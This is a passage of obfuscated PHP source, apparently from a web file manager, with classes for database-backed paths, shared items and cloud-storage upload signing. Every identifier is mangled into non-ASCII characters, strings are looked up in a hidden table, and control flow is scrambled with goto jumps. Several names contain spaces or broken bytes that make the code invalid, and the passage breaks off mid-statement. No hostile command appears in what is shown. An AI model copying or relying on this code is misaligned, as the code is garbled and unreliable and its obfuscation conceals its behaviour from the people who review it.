$DÀØøØ·¥[71] . $b“¤œ¼¾ä; $bçÃÌâ”É° = Cache::get($c®³ããé†÷); goto Eª…éíÆä±; Eª…éíÆä±: if ($bçÃÌâ”É°) { return $bçÃÌâ”É°; } $dÛ–©£ø±— = array($DÀØøØ·¥[509] => 0); if ($cÊ‹¼Òìµ != !1) { $dÛ–©£ø±—[$DÀØøØ·¥[451]] = $cÊ‹¼Òìµ; $dÛ–©£ø±—[$DÀØøØ·¥[367]] = $b“¤œ¼¾ä; } goto C®‰àù½Ñà; C®‰àù½Ñà: $bôÜ¼éÕÔ™ = array(); $bôÜ¼éÕÔ™[$DÀØøØ·¥[2233]] = array($DÀØøØ·¥[2234] => LNG($DÀØøØ·¥[2233]), $DÀØøØ·¥[2235] => $this->where($dÛ–©£ø±—)->count(), $DÀØøØ·¥[511] => $this->where($dÛ–©£ø±—)->sum($DÀØøØ·¥[78])); $cÒÆíàËŸ¢ = KodIO::fileTypeList(); goto dØ—¾Ì¬…ê; dØ—¾Ì¬…ê: foreach ($cÒÆíàËŸ¢ as $f‹ËÊ÷æ»å => $a“Ç³Ñ‘™™) { $dÛ–©£ø±—[$DÀØøØ·¥[368]] = $this->fileTypeWhere($f‹ËÊ÷æ»å); $bôÜ¼éÕÔ™[$f‹ËÊ÷æ»å] = array($DÀØøØ·¥[2234] => $a“Ç³Ñ‘™™[$DÀØøØ·¥[28]], $DÀØøØ·¥[2235] => $this->where($dÛ–©£ø±—)->count(), $DÀØøØ·¥[511] => $this->where($dÛ–©£ø±—)->sum($DÀØøØ·¥[78])); } Cache::set($c®³ããé†÷, $bôÜ¼éÕÔ™, 1200); return $bôÜ¼éÕÔ™; goto Fë«Ê•¢–Í; Fë«Ê•¢–Í: } public function fileNameExist($FÇÂ½ÙÚ¸, $cìéˆ°¡Ö’) { $B¦¨È‹ó«« =& $_SERVER[‘®…¢À]; $c›æªŞªŸ½ = $this->childList($FÇÂ½ÙÚ¸); foreach ($c›æªŞªŸ½ as $D¢òáˆˆÍ) { if ($D¢òáˆˆÍ[$B¦¨È‹ó««[28]] == $cìéˆ°¡Ö’) { return $D¢òáˆˆÍ[$B¦¨È‹ó««[365]]; } } return !1; } public function childList($AŞéöÌ¾ºï) { $B°ñÓÄ¼’æ =& $_SERVER[‘®…¢À]; $bˆË¯ğ—ôœ = array($B°ñÓÄ¼’æ[456] => intval($AŞéöÌ¾ºï), $B°ñÓÄ¼’æ[392] => 0); $fë‹êŸ¬©î = $this->cacheMemory()->where($bˆË¯ğ—ôœ)->select(); $fë‹êŸ¬©î = $fë‹êŸ¬©î ? $fë‹êŸ¬©î : array(); foreach ($fë‹êŸ¬©î as $aë‡ÚŒ) { $CªÇÕ–Šº… = $B°ñÓÄ¼’æ[405] . $aë‡ÚŒ[$B°ñÓÄ¼’æ[365]]; self::$cacheSourceInfo[$CªÇÕ–Šº…] = $aë‡ÚŒ; } return $fë‹êŸ¬©î; } public function fileNameAuto($b¬„ÄŠ‡ç‹, $FÉõùÑªİÖ, $A‘ë¬¹í = REPEAT_RENAME, $eŒ˜ì‰ = false) { $AŸ‹£àØƒ÷ =& $_SERVER[‘®…¢À]; $AáØÍí‹š = $this->childList($b¬„ÄŠ‡ç‹); $E•„Çõ„¯­ = array_to_keyvalue($AáØÍí‹š, $AŸ‹£àØƒ÷[33], $AŸ‹£àØƒ÷[28]); return $this->fileNameAutoGet($E•„Çõ„¯­, $FÉõùÑªİÖ, $A‘ë¬¹í, $eŒ˜ì‰); } public function fileNameAutoGet($Bø“ÚŠ¤–, $eÍÇÁÍ¥¦±, $F‰™Ú¶Ä•„, $E”´‘Şò) { $F”ç¦Ó×ˆ =& $_SERVER[‘®…¢À]; if ($F‰™Ú¶Ä•„ == REPEAT_REPLACE || !$Bø“ÚŠ¤– || !in_array_not_case($eÍÇÁÍ¥¦±, $Bø“ÚŠ¤–) || $E”´‘Şò && $F‰™Ú¶Ä•„ != REPEAT_RENAME_FOLDER) { return $eÍÇÁÍ¥¦±; } if ($F‰™Ú¶Ä•„ == REPEAT_SKIP) { return !1; } $CÜ‘­ÍæÀ = $F”ç¦Ó×ˆ[94] . get_path_ext($eÍÇÁÍ¥¦±); $CÜ‘­ÍæÀ = $CÜ‘­ÍæÀ == $F”ç¦Ó×ˆ[94] || $E”´‘Şò ? $F”ç¦Ó×ˆ[33] : $CÜ‘­ÍæÀ; for ($dù›Æóİ¡ = 1; $dù›Æóİ¡ <= count($Bø“ÚŠ¤–) + 1; $dù›Æóİ¡++) { $B·ğ•ë±—‚ = substr($eÍÇÁÍ¥¦±, 0, strlen($eÍÇÁÍ¥¦±) - strlen($CÜ‘­ÍæÀ)); $c“³ßÒîŒÎ = $B·ğ•ë±—‚ . "\50{$dù›Æóİ¡}\51{$CÜ‘­ÍæÀ}"; if (!in_array_not_case($c“³ßÒîŒÎ, $Bø“ÚŠ¤–)) { return $c“³ßÒîŒÎ; } } } } goto BÀÙ÷Áíåá; DÚ‰„¬œƒ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($D¨îã²Ã¹ä) { parent::__construct($D¨îã²Ã¹ä); $this->signatureVersion($_SERVER[‘®…¢À][197]); } public function uploadFormData($aå–¥¸àÚ, $DŠàäº­¹ = 3600) { goto D¹Å†„ĞËƒ; D¹Å†„ĞËƒ: $f“†ÄÜƒ†Á =& $_SERVER[‘®…¢À]; $Cîø®››Ç× = $f“†ÄÜƒ†Á[182]; $EÑšˆÊƒÁ = $f“†ÄÜƒ†Á[215]; goto Cƒ¶ÄäÒä; F…–Ä°Ú®‹: $eğ¥¯›ƒÑ† = array($f“†ÄÜƒ†Á[1052] => $d‚ĞŸáö½¸, $f“†ÄÜƒ†Á[1053] => array(array($f“†ÄÜƒ†Á[1054] => $Cîø®››Ç×), array($f“†ÄÜƒ†Á[1055] => $this->bucket), array($f“†ÄÜƒ†Á[1056], $f“†ÄÜƒ†Á[1057], $f“†ÄÜƒ†Á[33]), array($f“†ÄÜƒ†Á[1058] => $E™ÏÄ„æË÷), array($f“†ÄÜƒ†Á[1059] => $EÑšˆÊƒÁ), array($f“†ÄÜƒ†Á[1060] => $this->accessKey), array($f“†ÄÜƒ†Á[1061] => $bÈ‡Œôñ´Í))); $eğ¥¯›ƒÑ† = json_encode($eğ¥¯›ƒÑ†); $eµ“‚”œÔ© = hash_hmac($f“†ÄÜƒ†Á[215], $bÈ‡Œôñ´Í, $this->secret); goto bš‡ó±Šˆ÷; Cƒ¶ÄäÒä: $E™ÏÄ„æË÷ = $f“†ÄÜƒ†Á[1050]; $d‚ĞŸáö½¸ = gmdate($f“†ÄÜƒ†Á[1051], time() + $DŠàäº­¹); $bÈ‡Œôñ´Í = (string) time() . $f“†ÄÜƒ†Á[68] . (string) (time() + $DŠàäº­¹); goto F…–Ä°Ú®‹; fÆ¬¡…­Ñ©: return $AÌ”¿¹Çš½; goto eµ÷é—Ó—Ì; bš‡ó±Šˆ÷: $dºæ¦Ü’ = sha1($eğ¥¯›ƒÑ†); $a Úéªå³° = hash_hmac($f“†ÄÜƒ†Á[215], $dºæ¦Ü’, $eµ“‚”œÔ©); $AÌ”¿¹Çš½ = array($f“†ÄÜƒ†Á[1054] => $Cîø®››Ç×, $f“†ÄÜƒ†Á[1058] => $E™ÏÄ„æË÷, $f“†ÄÜƒ†Á[1062] => base64_encode($eğ¥¯›ƒÑ†), $f“†ÄÜƒ†Á[1059] => $EÑšˆÊƒÁ, $f“†ÄÜƒ†Á[1060] => $this->accessKey, $f“†ÄÜƒ†Á[1063] => $bÈ‡Œôñ´Í, $f“†ÄÜƒ†Á[1064] => $a Úéªå³°, $f“†ÄÜƒ†Á[166] => $this->getHost()); goto fÆ¬¡…­Ñ©; eµ÷é—Ó—Ì: } public function fileOutLink($c†£ øè’) { $fŒ†ñ èáë =& $_SERVER[‘®…¢À]; if (substr($c†£ øè’, 0, 7) == $fŒ†ñ èáë[1065]) { $c†£ øè’ = $fŒ†ñ èáë[1066] . substr($c†£ øè’, 7); } header($fŒ†ñ èáë[153] . $c†£ øè’); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Aèºó‘Øù) { $this->pathParse = $Aèºó‘Øù; $this->model = Model($_SERVER[‘®…¢À][1067]); } public function getPath($Aí­ê¹Ğ×ˆ) { return trim($Aí­ê¹Ğ×ˆ, $_SERVER[‘®…¢À][8]); } public function pathFather($EĞéÁ÷‹¼Ã) { $a“„«‰ø³‹ = $this->parse($EĞéÁ÷‹¼Ã); $a“„«‰ø³‹ = $this->infoSimple($EĞéÁ÷‹¼Ã); return $a“„«‰ø³‹ ? $a“„«‰ø³‹[$_SERVER[‘®…¢À][456]] : !1; } public function getPathName($fÚ«¢…ï¡Œ) { $D£Í‰¨¯Ïš = $this->infoSimple($fÚ«¢…ï¡Œ); return $D£Í‰¨¯Ïš ? $D£Í‰¨¯Ïš[$_SERVER[‘®…¢À][28]] : !1; } public function getPathOuter($bñ¢ÆŒ‚’Ÿ) { if (!$bñ¢ÆŒ‚’Ÿ) { return $bñ¢ÆŒ‚’Ÿ; } $B§®õòˆŸ« = $this->parse($bñ¢ÆŒ‚’Ÿ); return KodIO::make($B§®õòˆŸ«[$_SERVER[‘®…¢À][363]]); } public function copyFolderFromIO($Báäñ„Æ¬š, $AÁÑÇ“åÉÂ, $Bšã£¢»çŠ, $Cƒù˜½â”, $bçÑª†ø¨©) { $D³ÁÓôøÎ = $this->model->copyFolderFromIO($Báäñ„Æ¬š, $AÁÑÇ“åÉÂ, $Bšã£¢»çŠ, $Cƒù˜½â”, $bçÑª†ø¨©); return KodIO::make($D³ÁÓôøÎ); } public function isParentOf($D ×õ”ˆ’, $aÏŠ¤Á¾õÄ) { return $this->model->isParentOf($D ×õ”ˆ’, $aÏŠ¤Á¾õÄ); } public function mkfile($D ³Ä»Ò—, $aâ‡ÆãùÌ = '', $e¹ºò‘Å¶® = REPEAT_RENAME) { $BÖØ´ÛºŸ² =& $_SERVER[‘®…¢À]; $EœÀ®¨™¢š = $this->parse($D ³Ä»Ò—); $D ³Ä»Ò— = $EœÀ®¨™¢š[$BÖØ´ÛºŸ²[363]]; for ($aÇƒ¢²Ó° = 0; $aÇƒ¢²Ó° < count($EœÀ®¨™¢š[$BÖØ´ÛºŸ²[1068]]); $aÇƒ¢²Ó°++) { $fŸ­¯ô…™â = $EœÀ®¨™¢š[$BÖØ´ÛºŸ²[1068]][$aÇƒ¢²Ó°]; if ($aÇƒ¢²Ó° == count($EœÀ®¨™¢š[$BÖØ´ÛºŸ²[1068]]) - 1) { $D ³Ä»Ò— = $this->model->mkfile($D ³Ä»Ò—, $fŸ­¯ô…™â, $aâ‡ÆãùÌ, $e¹ºò‘Å¶®); break; } $D ³Ä»Ò— = $this->model->mkdir($D ³Ä»Ò—, $fŸ­¯ô…™â, REPEAT_SKIP); } return $this->getPathOuter($D ³Ä»Ò—); } public function mkdir($a²»ªñ˜å, $aÌ”œÔššİ = REPEAT_SKIP) { $FÍöŠÆÕÕÈ =& $_SERVER[‘®…¢À]; $dçïƒÜ…²ñ = $this->parse($a²»ªñ˜å); $a²»ªñ˜å = $dçïƒÜ…²ñ[$FÍöŠÆÕÕÈ[363]]; for ($eØåÙ’Ó‡Á = 0; $eØåÙ’Ó‡Á < count($dçïƒÜ…²ñ[$FÍöŠÆÕÕÈ[1068]]); $eØåÙ’Ó‡Á++) { $A©¦ù†Ğ´° = $dçïƒÜ…²ñ[$FÍöŠÆÕÕÈ[1068]][$eØåÙ’Ó‡Á]; $a²»ªñ˜å = $this->model->mkdir($a²»ªñ˜å, $A©¦ù†Ğ´°, $aÌ”œÔššİ); } return $this->getPathOuter($a²»ªñ˜å); } public function copyFile($Dµ¸ñÅœÁ», $AË—‘’ÑÑÑ, $CÆÅİ‚¡²Õ = REPEAT_REPLACE) { $B®ÔÕÈÊÎö =& $_SERVER[‘®…¢À]; $F’¸·Ñ‚×™ = $this->parse($AË—‘’ÑÑÑ); $d®ÇÄÇ¢‹Œ = $this->model->copy($Dµ¸ñÅœÁ», $F’¸·Ñ‚×™[$B®ÔÕÈÊÎö[363]], $CÆÅİ‚¡²Õ, $F’¸·Ñ‚×™[$B®ÔÕÈÊÎö[76]]); return $d®ÇÄÇ¢‹Œ ? $this->getPathOuter($d®ÇÄÇ¢‹Œ) : !1; } public function moveFile($Aã™”¡ã , $d¥ƒ¼Ò• Û, $d†å¦ÑŠ¡¦ = REPEAT_REPLACE) { $C¡ˆ¤Óä ù =& $_SERVER[‘®…¢À]; $Fš±ŞŞ‹íñ = $this->parse($d¥ƒ¼Ò• Û); $eô²­åœÙ¤ = $this->model->move($Aã™”¡ã , $Fš±ŞŞ‹íñ[$C¡ˆ¤Óä ù[363]], $d†å¦ÑŠ¡¦, $Fš±ŞŞ‹íñ[$C¡ˆ¤Óä ù[76]]); return $eô²­åœÙ¤ ? $this->getPathOuter($eô²­åœÙ¤) : !1; } public function copy($C÷ƒÅš‰Ÿè, $cšƒ¬±ì °, $F©¹°ÎŒ¯ = REPEAT_REPLACE) { $AøéÂÅ¦¹ = $this->parse($cšƒ¬±ì °); $Có—ù”ñÜ¦ = $this->model->copy($C÷ƒÅš‰Ÿè, $AøéÂÅ¦¹[$_SERVER[‘®…¢À][363]], $F©¹°ÎŒ¯); return $Có—ù”ñÜ¦ ? $this->getPathOuter($Có—ù”ñÜ¦) : !1; } public function move($d¦˜í‡¡Š³, $E„šŸÃÚÀó, $BŒŒÇîà£ = REPEAT_REPLACE) { $dØŠ¡œ¾‹· = $this->parse($E„šŸÃÚÀó); $d‡ŒÉàä = $this->model->move($d¦˜í‡¡Š³, $dØŠ¡œ¾‹·[$_SERVER[‘®…¢À][363]], $BŒŒÇîà£); return $d‡ŒÉàä ? $this->getPathOuter($d‡ŒÉàä) : !1; } public function remove($AËÖÎÁğ’, $B Œ…Ù—¬Ë = true) { return $this->model->remove($AËÖÎÁğ’, $B Œ…Ù—¬Ë); } public function rename($aÊÅ¿Ñ¤‹‘, $bÎ°«¢ºÌ‹) { $CÑ¿‰ÈÛÂİ = $this->model->rename($aÊÅ¿Ñ¤‹‘, $bÎ°«¢ºÌ‹); return $CÑ¿‰ÈÛÂİ ? $this->getPathOuter($aÊÅ¿Ñ¤‹‘) : $CÑ¿‰ÈÛÂİ; } public function size($C»š‰å‰) { $F—¾¢òö¬³ = $this->infoSimple($C»š‰å‰); return $F—¾¢òö¬³ ? $F—¾¢òö¬³[$_SERVER[‘®…¢À][78]] : 0; } public function infoSimple($F»ÌÁ©æµ) { return $this->model->sourceInfo($F»ÌÁ©æµ); } public function info($cßÊÙ¥°ÓÂ) { return $this->infoParse($cßÊÙ¥°ÓÂ); } public function infoAuth($C¹Œ¥ò”ç‘) { return $this->infoParse($C¹Œ¥ò”ç‘, !1, !0); } public function infoWithChildren($Eç¤áÂÔÖ›) { return $this->infoParse($Eç¤áÂÔÖ›, !0); } protected function infoParse($aÀöé“–£‚, $E‘ùã¢„Òô = false, $F¬øã„¿Ö˜ = false) { if (!$E‘ùã¢„Òô) { return $this->model->pathInfo($aÀöé“–£‚, $F¬øã„¿Ö˜); } return $this->model->pathInfoMore($aÀöé“–£‚); } public function infoFull($aÌ´»ƒÄÜ) { $eÇšŸ•é°­ =& $_SERVER[‘®…¢À]; $c‡Å‘Ï  Ù = explode($eÇšŸ•é°­[8], $aÌ´»ƒÄÜ); $eĞÙÑø§Æ® = implode($eÇšŸ•é°­[8], array_splice($c‡Å‘Ï  Ù, 1)); return $this->model->pathInfoByPath($c‡Å‘Ï  Ù[0], $eĞÙÑø§Æ®); } public function hashSimple($e¬Äˆ–Š¿Ş) { $cìÒßŠƒÜê =& $_SERVER[‘®…¢À]; $aãƒæ‚ä‚ = $this->infoWithChildren($e¬Äˆ–Š¿Ş); return $aãƒæ‚ä‚[$cìÒßŠƒÜê[159]][$cìÒßŠƒÜê[161]]; } public function hashMd5($Bé›ã©Â¼Ö) { $EÜˆ¥’èó =& $_SERVER[‘®…¢À]; $Cì‡¾Œ¿Å¡ = $this->infoWithChildren($Bé›ã©Â¼Ö); return $Cì‡¾Œ¿Å¡[$EÜˆ¥’èó[159]][$EÜˆ¥’èó[160]]; } public function exist($fĞõ¶íŸ•) { $eÜå›»ìç‘ =& $_SERVER[‘®…¢À]; $CÅïõ­ïõÄ = $this->parse($fĞõ¶íŸ•); if (!$CÅïõ­ïõÄ[$eÜå›»ìç‘[76]]) { return $this->isFile($fĞõ¶íŸ•) || $this->isFolder($fĞõ¶íŸ•); } $E•…ˆëÖö÷ = array($eÜå›»ìç‘[364] => $CÅïõ­ïõÄ[$eÜå›»ìç‘[363]], $eÜå›»ìç‘[28] => $CÅïõ­ïõÄ[$eÜå›»ìç‘[76]]); $BÈùçÖ’Ã = $this->model->where($E•…ˆëÖö÷)->find(); return $BÈùçÖ’Ã ? !0 : !1; } public function isFile($bØ™ œ‚ì–) { $fğÕ¹Õ‹‘ =& $_SERVER[‘®…¢À]; $e«„À¢ğäÙ = $this->infoSimple($bØ™ œ‚ì–); return $e«„À¢ğäÙ && $e«„À¢ğäÙ[$fğÕ¹Õ‹‘[366]] == $fğÕ¹Õ‹‘[84] ? !1 : !0; } public function isFolder($B ´­ƒ‘ç») { $FÃá…•Ñ¨Ê =& $_SERVER[‘®…¢À]; $CãÕ´œÊ‚ = $this->infoSimple($B ´­ƒ‘ç»); return $CãÕ´œÊ‚ && $CãÕ´œÊ‚[$FÃá…•Ñ¨Ê[366]] == $FÃá…•Ñ¨Ê[84] ? !0 : !1; } public function listPath($d™§·™µ™¾, $eãÜ‚øÆ…ğ = false) { $B»ÎÃÛâ„  =& $_SERVER[‘®…¢À]; if ($d™§·™µ™¾ == $B»ÎÃÛâ„ [33]) { return !1; } $e¢æİ±è = array($B»ÎÃÛâ„ [364] => $d™§·™µ™¾); if ($eãÜ‚øÆ…ğ) { return $this->model->listSource($e¢æİ±è, -1); } return $this->model->listSource($e¢æİ±è); } public function has($BÃÕåçŸÊË, $a”Ü…„°Í˜ = false, $DÆç… µÔ… = null) { $d˜ƒŠ×º“ =& $_SERVER[‘®…¢À]; $CÈôä‚‹ó = $this->infoWithChildren($BÃÕåçŸÊË); if ($a”Ü…„°Í˜) { return array($d˜ƒŠ×º“[189] => $CÈôä‚‹ó[$d˜ƒŠ×º“[189]], $d˜ƒŠ×º“[188] => $CÈôä‚‹ó[$d˜ƒŠ×º“[188]]); } return $DÆç… µÔ… ? $CÈôä‚‹ó[$d˜ƒŠ×º“[189]] : $CÈôä‚‹ó[$d˜ƒŠ×º“[188]]; } public function listAll($døÉĞÑí‡Š) { $CñÌŸÂ÷¢Ù = IO::info($this->pathParse[$_SERVER[‘®…¢À][76]]); if (!$CñÌŸÂ÷¢Ù) { return array(); } return $this->model->listAll($døÉĞÑí‡Š); } public function getContent($Bà‘¬Í‚öã) { return $this->model->getContent($Bà‘¬Í‚öã); } public function setContent($aÀÕÎ¬Ó’, $D¯‚íâ‚„Ö = '') { return $this->model->setContent($aÀÕÎ¬Ó’, $D¯‚íâ‚„Ö); } public function fileSubstr($dÏ»ğ©Û“, $cŠ¡‰¯ßŞ‹, $F‚µÏ§¢Ó¶) { return $this->model->fileSubstr($dÏ»ğ©Û“, $cŠ¡‰¯ßŞ‹, $F‚µÏ§¢Ó¶); } public function download($EÕõíÌŞÎ¢, $f³Àà¦‰½ƒ = '') { $a‡ÛÛ„¡Óİ = get_path_father($f³Àà¦‰½ƒ); $c½¡³„•ªÀ = get_path_this($f³Àà¦‰½ƒ); $dØºÔÛ£¡Š = $this->model->fileInfoGet($EÕõíÌŞÎ¢); $c‚˜†½Ã = IO::copy($dØºÔÛ£¡Š[$_SERVER[‘®…¢À][76]], $a‡ÛÛ„¡Óİ, !1, $c½¡³„•ªÀ); return $c‚˜†½Ã; } public function upload($e¿Öˆ©†, $dÕ¬‡‚Äœ, $eïÆ‘ºŒŞØ = false, $dà…›¯Šò = REPEAT_REPLACE) { $fŞó¹¦¢¸á =& $_SERVER[‘®…¢À]; $B˜£ƒÓ±òÍ = $this->parse($e¿Öˆ©†); $E—“Ø³„ß = $this->model->addFile($B˜£ƒÓ±òÍ[$fŞó¹¦¢¸á[363]], $dÕ¬‡‚Äœ, $B˜£ƒÓ±òÍ[$fŞó¹¦¢¸á[76]], $eïÆ‘ºŒŞØ, $dà…›¯Šò); return $this->getPathOuter($E—“Ø³„ß); } public function uploadFileByID($Câì…‰âùí, $Fğ››¬ìÕˆ, $C¹À•™‹¨Ú) { $EÕ¿ØÒ……å =& $_SERVER[‘®…¢À]; $B—ÍÑ²â¿Š = $this->parse($Câì…‰âùí); $c±æ×Éìò³ = $this->model->addFileByFileID($B—ÍÑ²â¿Š[$EÕ¿ØÒ……å[363]], $Fğ››¬ìÕˆ, $B—ÍÑ²â¿Š[$EÕ¿ØÒ……å[76]], $C¹À•™‹¨Ú); return $this->getPathOuter($c±æ×Éìò³); } public function addFileByRemote($dƒäó¦»º§, $c¿™Í«›†, $A®Ç¤‰ï‘µ = array(), $døêøÂÅ = '', $a±ÈÊèÌ ) { $d–À†Ø­‹‹ =& $_SERVER[‘®…¢À]; $f¯åº‡ã‰Ó = $this->parse($dƒäó¦»º§); $døêøÂÅ = empty($døêøÂÅ) ? $f¯åº‡ã‰Ó[$d–À†Ø­‹‹[76]] : $døêøÂÅ; $Cø·Œõç = $this->model->addFileByRemote($f¯åº‡ã‰Ó[$d–À†Ø­‹‹[363]], $c¿™Í«›†, $døêøÂÅ, $A®Ç¤‰ï‘µ, $a±ÈÊèÌ ); return $this->getPathOuter($Cø·Œõç); } public function uploadLink($Bî•—Æœ¢, $d“İµâ–¿Â = 0) { $b‘ë÷•…Ó¿ =& $_SERVER[‘®…¢À]; $f‰µùƒ„ß‚ = $this->parse($Bî•—Æœ¢); $Bî•—Æœ¢ = Model($b‘ë÷•…Ó¿[535])->createFileName($f‰µùƒ„ß‚[$b‘ë÷•…Ó¿[76]]); $bÃïÀ®”à = IO::uploadLink($Bî•—Æœ¢, $d“İµâ–¿Â); return $bÃïÀ®”à; } public function fileNameAuto($b¨Ó„••Æ½, $fæ‰ˆä¬›Å, $AÖƒÑ–„· = REPEAT_REPLACE, $D¯ÎÖÈ‘ã‘ = false) { return $this->model->fileNameAuto($b¨Ó„••Æ½, $fæ‰ˆä¬›Å, $AÖƒÑ–„·, $D¯ÎÖÈ‘ã‘); } public function fileNameExist($eô”ƒ…éÙ×, $eµ©§ù‘í¡) { return $this->model->fileNameExist($eô”ƒ…éÙ×, $eµ©§ù‘í¡); } protected function _fileOut($f›¶½º¡Ÿù, $C¯Ìé”®ö‰ = false, $dä‰ìÑ¿ƒä = false, $CÓÁ†ÏøÏ = '', $D·²çš—´¸ = false) { goto Bàµ¿ÜÂ÷; Bàµ¿ÜÂ÷: $d²õ…¼Œñ« =& $_SERVER[‘®…¢À]; $DˆäãˆÑí† = $this->model->sourceInfo($f›¶½º¡Ÿù); if ($DˆäãˆÑí†[$d²õ…¼Œñ«[366]] == $d²õ…¼Œñ«[84]) { header($d²õ…¼Œñ«[1069]); die; } goto d¯›½ÏòáÇ; d¯›½ÏòáÇ: $B‹¯á’º³Ô = $this->model->fileInfoGet($f›¶½º¡Ÿù); $CÓÁ†ÏøÏ = $B‹¯á’º³Ô[$d²õ…¼Œñ«[160]] ? $B‹¯á’º³Ô[$d²õ…¼Œñ«[160]] : $CÓÁ†ÏøÏ; $BŞ‹”øÕï = isset($GLOBALS[$d²õ…¼Œñ«[1070]]) ? $GLOBALS[$d²õ…¼Œñ«[1070]] : $DˆäãˆÑí†[$d²õ…¼Œñ«[28]]; goto EØ‚ÃÙÕªÕ; EØ‚ÃÙÕªÕ: if ($D·²çš—´¸) { return IO::fileOutServer($B‹¯á’º³Ô[$d²õ…¼Œñ«[76]], $C¯Ìé”®ö‰, $BŞ‹”øÕï, $CÓÁ†ÏøÏ); } IO::fileOut($B‹¯á’º³Ô[$d²õ…¼Œñ«[76]], $C¯Ìé”®ö‰, $BŞ‹”øÕï, $CÓÁ†ÏøÏ); goto aœ™ĞÖ‰§ø; aœ™ĞÖ‰§ø: } public function fileOut($dÒŒ§±…±·, $bØ µíÑ‰ = false, $DÎ‘Ö¥®’ = false, $cŒÃ‘é×ƒ = '') { $this->_fileOut($dÒŒ§±…±·, $bØ µíÑ‰, $DÎ‘Ö¥®’, $cŒÃ‘é×ƒ); } public function fileOutServer($Dƒë§Á œŠ, $Cº˜Ïíğ•” = false, $eø¶¶Ù¬äË = false, $d„‘ˆãÛ‡Ğ = '') { $this->_fileOut($Dƒë§Á œŠ, $Cº˜Ïíğ•”, $eø¶¶Ù¬äË, $d„‘ˆãÛ‡Ğ, !0); } protected function _fileOutImage($DŒæ˜™ÍÀÎ, $D…â²øŸ = 250) { $D¸¯Á¯ŸÂ¾ =& $_SERVER[‘®…¢À]; $Añ×íŞ¼ó = $this->model->sourceInfo($DŒæ˜™ÍÀÎ); if ($Añ×íŞ¼ó[$D¸¯Á¯ŸÂ¾[366]] == $D¸¯Á¯ŸÂ¾[84]) { show_json($D¸¯Á¯ŸÂ¾[1071] . $DŒæ˜™ÍÀÎ, !1); } $GLOBALS[$D¸¯Á¯ŸÂ¾[1070]] = $Añ×íŞ¼ó[$D¸¯Á¯ŸÂ¾[28]]; $D¸æ©¨îïµ = $this->model->fileInfoGet($DŒæ˜™ÍÀÎ); IO::fileOutImage($D¸æ©¨îïµ[$D¸¯Á¯ŸÂ¾[76]], $D…â²øŸ); } public function fileOutImage($fæ·«Â„ğ, $fø×±Ø‰Ş… = 250) { $this->_fileOutImage($fæ·«Â„ğ, $fø×±Ø‰Ş…); } public function fileOutImageServer($dÜ§ö´…Ÿ˜, $AÇ„ğåˆÉ« = 250) { $this->_fileOutImage($dÜ§ö´…Ÿ˜, $AÇ„ğåˆÉ«); } public function link($Cğ´åÛÍŒÛ, $dö¨×ÁØÉ  = '') { $C¸£“â = $this->model->fileInfoGet($Cğ´åÛÍŒÛ); return IO::link($C¸£“â[$_SERVER[‘®…¢À][76]], $dö¨×ÁØÉ ); } protected function parse($f„ƒ­™ÚÄù) { $dÔ‰Ä‰À‘ï =& $_SERVER[‘®…¢À]; if (strstr($f„ƒ­™ÚÄù, $dÔ‰Ä‰À‘ï[8]) === !1) { return array($dÔ‰Ä‰À‘ï[381] => intval($f„ƒ­™ÚÄù), $dÔ‰Ä‰À‘ï[76] => $dÔ‰Ä‰À‘ï[33], $dÔ‰Ä‰À‘ï[1068] => array()); } $AÓ‹¦Ã„–Ã = explode($dÔ‰Ä‰À‘ï[8], trim($f„ƒ­™ÚÄù, $dÔ‰Ä‰À‘ï[8])); if (count($AÓ‹¦Ã„–Ã) < 2) { show_tips($f„ƒ­™ÚÄù . $dÔ‰Ä‰À‘ï[1072]); } return array($dÔ‰Ä‰À‘ï[381] => intval($AÓ‹¦Ã„–Ã[0]), $dÔ‰Ä‰À‘ï[76] => $AÓ‹¦Ã„–Ã[1], $dÔ‰Ä‰À‘ï[1068] => array_slice($AÓ‹¦Ã„–Ã, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($d–É«çï×¤) { $this->pathParse = $d–É«çï×¤; $this->model = Model($_SERVER[‘®…¢À][1067]); } public function getPathOuter($fößñ«İÏ) { $CÅİ«…à’ø =& $_SERVER[‘®…¢À]; if (!$fößñ«İÏ) { return $fößñ«İÏ; } $B”æ¼„“”® = $this->parse($fößñ«İÏ); return trim(KodIO::makeShare($this->pathParse[$CÅİ«…à’ø[363]], $B”æ¼„“”®[$CÅİ«…à’ø[363]]), $CÅİ«…à’ø[8]); } protected function infoParse($DĞÑ¥ëš, $Dˆ…Ã‹´ù = false, $a–çŸÕ‡’™ = false) { $d¸¨Ûœ¸§’ =& $_SERVER[‘®…¢À]; $d·¬ İêË“ = $this->pathParse[$d¸¨Ûœ¸§’[363]]; $AÑœéÎœ¹ = trim($this->pathParse[$d¸¨Ûœ¸§’[968]], $d¸¨Ûœ¸§’[8]); return Action($d¸¨Ûœ¸§’[1073])->sharePathInfo($d·¬ İêË“, $AÑœéÎœ¹); } public function infoFull($Aï÷á†ŞŒÖ) { $aí¶‹£µçÖ =& $_SERVER[‘®…¢À]; $FÒ×ÊÍÎ„Æ = explode($aí¶‹£µçÖ[8], trim($Aï÷á†ŞŒÖ, $aí¶‹£µçÖ[8])); if (count($FÒ×ÊÍÎ„Æ) > 1) { $DãßƒÇ½–« = implode($aí¶‹£µçÖ[8], array_splice($FÒ×ÊÍÎ„Æ, 1)); $eÉõ­²È¿Õ = $this->model->pathInfoByPath($FÒ×ÊÍÎ„Æ[0], $DãßƒÇ½–«); if (!$eÉõ­²È¿Õ) { return !1; } $this->pathParse[$aí¶‹£µçÖ[968]] = $eÉõ­²È¿Õ[$aí¶‹£µçÖ[365]]; } return $this->infoParse($Aï÷á†ŞŒÖ); } public function listAll($Dù¬°¹Ûœ–) { goto F»¾Ñæà¨; A†ÈÆ‰Ç« : $BÄòéæ² = $this->model->listAll($Dù¬°¹Ûœ–); $d…Üôàİ¶„ = Model($B¡Œƒ¬˜˜‘[527])->getInfo($CòÓ¹°’¯‡[$B¡Œƒ¬˜˜‘[436]]); $dğÁëæ‘é» = Action($B¡Œƒ¬˜˜‘[1073]); goto aÇ”å¤µóö; aÇ”å¤µóö: foreach ($BÄòéæ² as &$AæµäÄä«é) { check_abort(); $AæµäÄä«é[$B¡Œƒ¬˜˜‘[387]] = $dğÁëæ‘é»->_shareItemeParse($AæµäÄä«é[$B¡Œƒ¬˜˜‘[387]], $d…Üôàİ¶„); } return $BÄòéæ²; goto EÆÕ†±áÙ; F»¾Ñæà¨: $B¡Œƒ¬˜˜‘ =& $_SERVER[‘®…¢À]; $CòÓ¹°’¯‡ 